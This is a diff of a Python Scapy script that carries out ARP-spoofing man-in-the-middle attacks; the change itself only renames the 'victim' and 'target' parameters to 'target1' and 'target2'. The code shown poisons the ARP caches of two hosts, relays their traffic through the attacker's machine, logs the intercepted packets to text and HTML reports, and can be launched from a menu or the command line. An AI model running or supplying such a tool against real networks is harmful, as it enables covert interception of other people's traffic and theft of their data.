@@ -58,19 +58,19 @@ def getApplicationProtocol(packet):
     
     return protocols
 
-def arpSpoof(targetIp, spoofIp, iface):
+def arpSpoof(target2, spoofIp, iface):
     """Send ARP spoof packets to poison the target's ARP cache."""
-    pkt = ARP(op=2, pdst=targetIp, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoofIp)
-    print(f"Sending ARP spoof packets to target {targetIp}, impersonating {spoofIp}.")
+    pkt = ARP(op=2, pdst=target2, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoofIp)
+    print(f"Sending ARP spoof packets to target {target2}, impersonating {spoofIp}.")
     while running:
         send(pkt, iface=iface, verbose=False)
         time.sleep(1)
 
-def forwardPacket(pkt, victimIp, targetIp, iface):
+def forwardPacket(pkt, target1, target2, iface):
     """Forward packets only between victim and target."""
     if pkt.haslayer(IP):
-        if (pkt[IP].src == victimIp and pkt[IP].dst == targetIp) or \
-           (pkt[IP].src == targetIp and pkt[IP].dst == victimIp):
+        if (pkt[IP].src == target1 and pkt[IP].dst == target2) or \
+           (pkt[IP].src == target2 and pkt[IP].dst == target1):
             sendp(pkt, iface=iface, verbose=False)
 
 def logPacket(pkt, txt_file):
@@ -144,7 +144,7 @@ def generateHtmlReport(txtFilename):
             html_file.write(html_content)
         print("HTML report generated: report.html")
 
-def sniffPackets(victimIp, targetIp, iface, log=False):
+def sniffPackets(target1, target2, iface, log=False):
     """Sniff packets, forward them, and optionally log to a text file."""
     txt_file = None
     if log:
@@ -157,9 +157,9 @@ def sniffPackets(victimIp, targetIp, iface, log=False):
     
     def packetHandler(pkt):
         if pkt.haslayer(IP):
-            if (pkt[IP].src == victimIp and pkt[IP].dst == targetIp) or \
-               (pkt[IP].src == targetIp and pkt[IP].dst == victimIp):
-                forwardPacket(pkt, victimIp, targetIp, iface)
+            if (pkt[IP].src == target1 and pkt[IP].dst == target2) or \
+               (pkt[IP].src == target2 and pkt[IP].dst == target1):
+                forwardPacket(pkt, target1, target2, iface)
                 if log:
                     logPacket(pkt, txt_file)
     
@@ -173,26 +173,26 @@ def sniffPackets(victimIp, targetIp, iface, log=False):
             if log:
                 generateHtmlReport("sniffingData.txt")
 
-def startAttack(victimIp, targetIp, iface, report):
+def startAttack(target1, target2, iface, report):
     """Start the ARP spoofing attack with optional reporting."""
-    threading.Thread(target=arpSpoof, args=(victimIp, targetIp, iface), daemon=True).start()
-    threading.Thread(target=arpSpoof, args=(targetIp, victimIp, iface), daemon=True).start()
-    sniffPackets(victimIp, targetIp, iface, log=report)
+    threading.Thread(target=arpSpoof, args=(target1, target2, iface), daemon=True).start()
+    threading.Thread(target=arpSpoof, args=(target2, target1, iface), daemon=True).start()
+    sniffPackets(target1, target2, iface, log=report)
 
 def menu():
     """Interactive menu for user input."""
     RED = "\033[38;2;255;0;0m"
     RESET = "\033[0m"
-    victimIp = input(f"{RED}\nHost IP: {RESET}")
-    targetIp = input(f"{RED}Target IP: {RESET}")
+    target1 = input(f"{RED}\nTarget 1 IP: {RESET}")
+    target2 = input(f"{RED}Target 2 IP: {RESET}")
     interface = input(f"{RED}Interface: {RESET}")
     while True:
         report_input = input("Want to create a report during the attack? [Y]es | [N]o: ")
         if report_input.lower() == "y":
-            startAttack(victimIp, targetIp, interface, True)
+            startAttack(target1, target2, interface, True)
             break
         elif report_input.lower() == "n":
-            startAttack(victimIp, targetIp, interface, False)
+            startAttack(target1, target2, interface, False)
             break
         else:
             print("Invalid input. Please enter 'Y' or 'N'.")
@@ -200,12 +200,12 @@ def menu():
 def terminal():
     """Handle command-line arguments."""
     parser = argparse.ArgumentParser(description="ARP Spoofing", formatter_class=argparse.RawTextHelpFormatter)
-    parser.add_argument("-v", "--victimip", required=True, help="Victim IP address.")
-    parser.add_argument("-t", "--targetip", required=True, help="Target IP address.")
+    parser.add_argument("-t1", "--target1", required=True, help="Target 1 IP address.")
+    parser.add_argument("-t2", "--target2", required=True, help="Target 2 IP address.")
     parser.add_argument("-i", "--interface", required=True, help="Interface to use for the attack.")
     parser.add_argument("-r", "--report", action="store_true", help="Create a report.")
     args = parser.parse_args()
-    startAttack(args.victimip, args.targetip, args.interface, args.report)
+    startAttack(args.target1, args.target2, args.interface, args.report)
 
 def signalHandler(sig, frame):
     """Handle Ctrl+C to stop the attack gracefully."""
